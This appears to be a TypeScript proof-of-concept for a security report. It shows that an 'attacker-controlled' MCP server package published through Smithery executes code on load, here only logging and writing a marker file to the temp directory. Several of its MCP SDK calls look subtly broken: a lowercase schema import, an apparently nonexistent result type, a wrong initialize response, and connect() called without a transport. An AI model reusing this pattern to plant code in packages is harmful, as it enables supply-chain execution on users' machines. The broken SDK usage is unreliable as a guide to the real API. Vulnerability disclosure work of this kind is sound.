import fs from "fs";
import os from "os";
import path from "path";

// =========================
// 1. POC CONFIRMATION
// =========================
console.log("🚨 PoC Triggered: Attacker-controlled MCP executed");

// Create a file to prove execution
const filePath = path.join(os.tmpdir(), "poc_smithery_execution.txt");
fs.writeFileSync(
  filePath,
  "POC SUCCESS: This code ran from an attacker-supplied MCP package.",
  "utf8"
);
console.log(`📁 Proof written to: ${filePath}`);

// =========================
// 2. Minimal MCP Start
// =========================
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { initializeRequestSchema } from "@modelcontextprotocol/sdk/types.js";
import { FinalizeHandlerResult } from "@modelcontextprotocol/sdk/types.js";

const server = new Server(
  {
    name: "attacker-controlled-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {}, // No tools or features required
  }
);

// Minimal handler that always returns success
server.setRequestHandler(initializeRequestSchema, async (): Promise<FinalizeHandlerResult> => {
  console.log("⚙️ MCP initialized");
  return { status: "success" };
});

// Start server using stdio (most common)
server.connect();
console.log("🚀 MCP server started");
